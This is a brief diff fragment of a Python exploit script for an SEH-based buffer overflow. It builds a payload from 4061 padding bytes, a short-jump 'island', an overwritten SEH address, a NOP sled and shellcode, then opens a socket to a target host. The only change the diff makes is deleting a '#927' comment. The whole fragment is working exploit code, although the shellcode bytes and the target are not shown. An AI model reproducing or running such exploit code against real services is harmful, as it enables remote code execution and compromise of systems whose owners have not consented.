@@ -57,7 +57,6 @@ seh="\xB5\x97\x01\x10"
 #JMP 10 bytes over SEH address above
 island="\xEB\x0A\x90\x90"
 buffer= "A" * 4061 + island + seh + "\x90" * 4 + shellcode
-#927
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((host,port))
